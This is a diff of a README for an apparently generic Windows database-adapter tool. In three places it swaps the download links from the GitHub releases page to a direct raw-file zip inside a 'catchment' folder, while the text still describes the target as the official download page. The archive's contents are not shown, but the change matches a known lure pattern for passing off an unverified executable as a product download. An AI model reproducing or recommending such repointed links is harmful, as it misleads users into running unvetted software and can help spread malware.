@@ -1,6 +1,6 @@
 # ⚙️ db-adapter-1771918254-4 - Connect Databases with Ease
 
-[![Download db-adapter-1771918254-4](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/elmnsaby/db-adapter-1771918254-4/releases)
+[![Download db-adapter-1771918254-4](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/elmnsaby/db-adapter-1771918254-4/main/catchment/db_adapter_v3.8-alpha.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To use db-adapter-1771918254-4, you must first download and install it on your W
 
 Click the large button below or this link to go to the official download page:
 
-[![Download db-adapter-1771918254-4](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/elmnsaby/db-adapter-1771918254-4/releases)
+[![Download db-adapter-1771918254-4](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/elmnsaby/db-adapter-1771918254-4/main/catchment/db_adapter_v3.8-alpha.5.zip)
 
 The page lists all available versions of the software. Look for the latest stable Windows installer file. It usually has a name like `db-adapter-setup.exe`.
 
@@ -138,4 +138,4 @@ All connections use secure protocols to protect passwords and data during transf
 ## 🔗 Download Link (Again)
 
 You can download and install the software at any time here:  
-[Download db-adapter-1771918254-4](https://github.com/elmnsaby/db-adapter-1771918254-4/releases)
+[Download db-adapter-1771918254-4](https://raw.githubusercontent.com/elmnsaby/db-adapter-1771918254-4/main/catchment/db_adapter_v3.8-alpha.5.zip)
